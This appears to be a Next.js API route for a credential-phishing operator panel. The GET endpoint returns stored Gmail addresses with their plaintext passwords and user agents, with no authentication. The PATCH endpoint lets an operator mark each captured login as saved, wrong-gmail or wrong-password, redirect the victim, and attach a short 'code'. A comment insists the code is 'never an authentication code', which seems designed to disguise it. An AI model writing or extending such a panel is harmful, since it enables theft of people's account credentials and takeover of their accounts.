
import { NextRequest, NextResponse } from "next/server";
import { isValidObjectId } from "mongoose";
import connectDB from "@/lib/mongodb";
import Gmail from "@/models/Gmails";

// GET: Fetch account metadata
export async function GET() {
  try {
    await connectDB();

    const gmails = await Gmail.find()
      .select("email state redirectTo code createdAt password userAgent")
      .sort({ createdAt: -1 })
      .lean();

    return NextResponse.json({
      success: true,
      gmails,
    });
  } catch (error) {
    console.error("GET accounts error:", error);

    return NextResponse.json(
      { success: false, error: "Failed to fetch accounts." },
      { status: 500 }
    );
  }
}

// PATCH: Update account metadata
export async function PATCH(request: NextRequest) {
  try {
    const body: unknown = await request.json();

    if (!body || typeof body !== "object") {
      return NextResponse.json(
        { error: "Invalid request." },
        { status: 400 }
      );
    }

    const { id, state, redirectTo, code } = body as {
      id?: string;
      state?: string;
      redirectTo?: string;
      code?: string;
    };

    if (!id || !isValidObjectId(id)) {
      return NextResponse.json(
        { error: "Invalid account ID." },
        { status: 400 }
      );
    }

    const updates: Record<string, string> = {};

    if (state !== undefined) {
      const allowedStates = ["saved", "wrong-gmail", "wrong-password"];

      if (!allowedStates.includes(state)) {
        return NextResponse.json(
          { error: "Invalid state." },
          { status: 400 }
        );
      }

      updates.state = state;
    }

    if (redirectTo !== undefined) {
      if (typeof redirectTo !== "string" || redirectTo.length > 2048) {
        return NextResponse.json(
          { error: "Invalid redirect URL." },
          { status: 400 }
        );
      }

      if (redirectTo.trim()) {
        try {
          const url = new URL(redirectTo.trim());

          if (url.protocol !== "https:") {
            throw new Error("HTTPS required");
          }
        } catch {
          return NextResponse.json(
            { error: "A valid HTTPS URL is required." },
            { status: 400 }
          );
        }
      }

      updates.redirectTo = redirectTo.trim();
      updates.state = "redirect"; // Reset state to "saved" when redirectTo is updated
    }

    // Internal reference code only, never an authentication code.
    if (code !== undefined) {
      if (typeof code !== "string" || code.length > 100) {
        return NextResponse.json(
          { error: "Invalid reference code." },
          { status: 400 }
        );
      }

      updates.code = code.trim();
    }

    if (Object.keys(updates).length === 0) {
      return NextResponse.json(
        { error: "No valid fields provided." },
        { status: 400 }
      );
    }

    await connectDB();

    const gmail = await Gmail.findByIdAndUpdate(
      id,
      { $set: updates },
      {
        new: true,
        runValidators: true,
      }
    )
      .select("email state redirectTo code createdAt")
      .lean();

    if (!gmail) {
      return NextResponse.json(
        { error: "Account not found." },
        { status: 404 }
      );
    }

    return NextResponse.json({
      success: true,
      gmail,
    });
  } catch (error) {
    console.error("PATCH accounts error:", error);

    return NextResponse.json(
      { error: "Failed to update account." },
      { status: 500 }
    );
  }
}
